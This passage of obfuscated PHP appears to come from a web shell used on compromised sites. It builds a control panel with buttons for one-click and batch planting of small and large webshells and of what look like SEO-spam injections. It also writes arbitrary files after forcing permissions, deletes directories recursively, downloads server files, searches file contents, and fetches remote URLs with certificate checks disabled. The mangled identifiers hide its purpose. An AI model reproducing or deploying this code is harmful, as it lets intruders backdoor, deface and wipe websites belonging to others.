        $QSO8f .= "<input type=\"checkbox\" id=\"chkall\" name=\"chkall\" value=\"on\" onclick=\"sa(this.form);\"> ";
        $QSO8f .= "<input type=\"button\" value=\"����\" style=\"width:50px;\" onclick='txts(\"����·��\",\"" . $Jzwra . "\",\"a\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"ɾ��\" style=\"width:50px;\" onclick='dels(\"b\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"����\" style=\"width:50px;\" onclick='txts(\"����ֵ\",\"0666\",\"c\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"ʱ��\" style=\"width:50px;\" onclick='txts(\"�޸�ʱ��\",\"" . $yICDZ . "\",\"d\");'> ";
        $QSO8f .= "</br>&nbsp;&nbsp;&nbsp;&nbsp;";
        $QSO8f .= "<input type=\"button\" value=\"һ��СM\" style=\"width:80px;\" onclick='txts(\"һ��СM\",\"" . $Jzwra . "\",\"xiaoma\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"����СM\" style=\"width:80px;\" onclick='pltexts(\"����СM\",\"" . $Jzwra . "\",\"plxiaoma\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"һ����M\" style=\"width:80px;\" onclick='txts(\"һ����M\",\"" . $Jzwra . "\",\"dama\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"���´�M\" style=\"width:80px;\" onclick='txts(\"���´�M\",\"" . $Jzwra . "\",\"gxdama\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"������M\" style=\"width:80px;\" onclick='pltexts(\"������M\",\"" . $Jzwra . "\",\"pldama\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"һ��GZL\" style=\"width:80px;\" onclick='txts(\"һ��GZL\",\"" . $Jzwra . "\",\"gzl\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"����GZL\" style=\"width:80px;\" onclick='pltexts(\"����GZL\",\"" . $Jzwra . "\",\"plgzl\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"һ��TDK\" style=\"width:80px;\" onclick='pltexts(\"һ��TDK\",\"" . $Jzwra . "\",\"TDK\");'> ";
        $QSO8f .= "<input type=\"button\" value=\"һ��JSC\" style=\"width:80px;\" onclick='txts(\"һ��JSC\",\"" . $Jzwra . "\",\"JSC\");'> ";
        $QSO8f .= "</br>&nbsp;&nbsp;&nbsp;&nbsp;";
        $QSO8f .= "Ŀ¼[" . $CU3_o . "] - �ļ�[" . $DOdBZ . "] - ����[" . $RoNtC . "]</div></form>";
        return $QSO8f;
    }
}
function MWEmb($YJnbr)
{
    foreach ($YJnbr as $iW8f4 => $KPtbK) {
        $YJnbr[$iW8f4] = is_array($KPtbK) ? MweMb($KPtbK) : stripslashes($KPtbK);
    }
    return $YJnbr;
}
function pbm07($xndOv)
{
    return str_replace(array("\\", "//", "%27", "%22"), array("/", "/", "'", "\""), chop($xndOv));
}
function c4gHR($b00lT)
{
    $b00lT = pBM07($b00lT . "/");
    try {
        if (($bJ62o = @opendir($b00lT)) == NULL) {
            return false;
        }
    } catch (Throwable $yVbeC) {
        return false;
    }
    $YJnbr = array();
    while (false !== ($Kes_q = readdir($bJ62o))) {
        if ($Kes_q == "." || $Kes_q == "..") {
        }
        $PfRvL = $b00lT . $Kes_q;
        $Kes_q = strtr($Kes_q, array("'" => "%27", "\"" => "%22"));
        if (is_dir($PfRvL)) {
            $YJnbr["dir"][$PfRvL] = $Kes_q;
        }
        $YJnbr["file"][$PfRvL] = $Kes_q;
    }
    closedir($bJ62o);
    return $YJnbr;
}
function AXTtq()
{
    $QSO8f = '';
    if (isset($_POST["getpwd"])) {
        $QSO8f .= "<input type=\"hidden\" name=\"getpwd\" value=\"" . $_POST["getpwd"] . "\">";
    }
    if (isset($_POST["pass"])) {
        $QSO8f .= "<input type=\"hidden\" name=\"pass\" value=\"" . $_POST["pass"] . "\">";
    }
    if (isset($_POST["pass"]) && isset($_POST[$_POST["pass"]])) {
        $QSO8f .= "<input type=\"hidden\" name=\"" . $_POST["pass"] . "\" value=\"" . $_POST[$_POST["pass"]] . "\">";
    }
    if (isset($_POST["check"])) {
        $QSO8f .= "<input type=\"hidden\" name=\"check\" value=\"" . $_POST["check"] . "\">";
    }
    return $QSO8f;
}
function lGu3j($eb_7J, $NC0z_, $fyjvY)
{
    if (!is_writable($eb_7J) && file_exists($eb_7J)) {
        chmod($eb_7J, 0666);
    }
    $iW8f4 = false;
    try {
        $bJ62o = fopen($eb_7J, $fyjvY);
        $iW8f4 = fputs($bJ62o, $NC0z_);
        fclose($bJ62o);
    } catch (Throwable $yVbeC) {
    }
    return $iW8f4;
}
function JwptB($eb_7J)
{
    $bJ62o = fopen($eb_7J, "r");
    if (filesize($eb_7J) > 0) {
        $NC0z_ = fread($bJ62o, filesize($eb_7J));
    } else {
        $NC0z_ = '';
    }
    fclose($bJ62o);
    return $NC0z_;
}
function fiVRg($t_nY5, $fqqEu)
{
    $iW8f4 = move_uploaded_file($t_nY5, $fqqEu) ? true : false;
    if (!$iW8f4) {
        $iW8f4 = copy($t_nY5, $fqqEu) ? true : false;
    }
    return $iW8f4;
}
function VZo7e($eb_7J)
{
    if (!file_exists($eb_7J)) {
        return false;
    }
    ob_end_clean();
    $Kes_q = basename($eb_7J);
    $YJnbr = explode(".", $Kes_q);
    header("Content-type: application/x-" . array_pop($YJnbr));
    header("Content-Disposition: attachment; filename=" . $Kes_q);
    header("Content-Length: " . filesize($eb_7J));
    @readfile($eb_7J);
    exit;
}
function MRF0Q($b00lT)
{
    $bJ62o = @opendir($b00lT);
    while (false !== ($Kes_q = @readdir($bJ62o))) {
        if ($Kes_q == "." || $Kes_q == "..") {
        }
        $PfRvL = $b00lT . $Kes_q;
        @chmod($PfRvL, 0777);
        if (is_dir($PfRvL)) {
            Mrf0Q($PfRvL . "/");
        }
        @unlink($PfRvL);
    }
    @closedir($bJ62o);
    return @rmdir($b00lT);
}
function IDYFr($IMG07)
{
    if ($IMG07 < 1024) {
        return $IMG07 . " B";
    }
    $YJnbr = array("B", "K", "M", "G", "T");
    $bNTax = floor(log($IMG07) / log(1024));
    return sprintf("%.2f " . $YJnbr[$bNTax], $IMG07 / pow(1024, floor($bNTax)));
}
function iIPyZ($YJnbr, $g9_WW)
{
    foreach ($YJnbr as $iW8f4) {
        if (stristr($g9_WW, $iW8f4)) {
            return true;
        }
    }
    return false;
}
function MDXrQ($N8fwX = 8)
{
    $SWSuO = array("a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $KYc_0 = array_rand($SWSuO, $N8fwX);
    $xndOv = '';
    if (is_int($KYc_0)) {
        $xndOv = $SWSuO[$KYc_0];
    } else {
        shuffle($KYc_0);
        foreach ($KYc_0 as $Hzx0E) {
            $xndOv .= $SWSuO[$Hzx0E];
        }
    }
    return $xndOv;
}
function dQr9r($b00lT, $iW8f4, $SMX_3, $f1bw2, $q52rn, $Ktp_B, $n_geq, $Nzv3E)
{
    try {
        if (($bJ62o = @opendir($b00lT)) == NULL) {
            return '';
        }
    } catch (Throwable $yVbeC) {
        return '';
    }
    $QSO8f = '';
    while (false !== ($Kes_q = readdir($bJ62o))) {
        if ($Kes_q == "." || $Kes_q == "..") {
        }
        $PfRvL = $b00lT . $Kes_q;
        if (is_dir($PfRvL)) {
            if (!($f1bw2 && in_array($Kes_q, $f1bw2))) {
                if ($n_geq == 0 && is_readable($PfRvL)) {
                    $QSO8f .= DqR9R($PfRvL . "/", $iW8f4, $SMX_3, $f1bw2, $q52rn, $Ktp_B, $n_geq, $Nzv3E);
                }
            }
        }
        if (!($SMX_3 && !iiPyz($SMX_3, $Kes_q))) {
            $uS2nL = $q52rn ? JwPtB($PfRvL) : $Kes_q;
            $A5Kw2 = $Ktp_B ? stristr($uS2nL, $iW8f4) : (strpos(iDyFr(filesize($PfRvL)), "M") ? false : strpos($uS2nL, $iW8f4) > -1);
            if ($A5Kw2) {
                $SFJ9z = strtr($PfRvL, array($Nzv3E => '', "'" => "%27", "\"" => "%22"));
                $QSO8f .= "<a href=\"javascript:go('editor','" . $SFJ9z . "');\">�༭</a> " . $PfRvL . "<br>";
                flush();
                ob_flush();
            }
            unset($uS2nL);
        }
    }
    closedir($bJ62o);
    return $QSO8f;
}
function cIVgh($N1G2o, $Q9zRG = 30, $kRKZ7 = 1)
{
    $c9X7t = curl_init();
    $PItFp = array("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Upgrade-Insecure-Requests: 1", "DNT:1", "Accept-Language: zh-CN,zh;q=0.9", "User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36");
    curl_setopt($c9X7t, CURLOPT_HTTPHEADER, $PItFp);
    curl_setopt($c9X7t, CURLOPT_TIMEOUT, $Q9zRG);
    curl_setopt($c9X7t, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c9X7t, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($c9X7t, CURLOPT_URL, $N1G2o);
    if ($kRKZ7 == 1) {
        curl_setopt($c9X7t, CURLOPT_RETURNTRANSFER, true);
    }
    $rVq02 = curl_exec($c9X7t);
    if (!$rVq02) {
        $VO03Y = curl_errno($c9X7t);
        var_dump($VO03Y);
    }
    curl_close($c9X7t);
    return $rVq02;
}
function x8024($xndOv, $Go0li = '', $wrqOC = '')
{
    if ($Go0li) {
        $xndOv = stristr($xndOv, $Go0li, false);
        $xndOv = substr($xndOv, strlen($Go0li));
    }
    $wrqOC && ($xndOv = stristr($xndOv, $wrqOC, true));
    return trim($xndOv);
}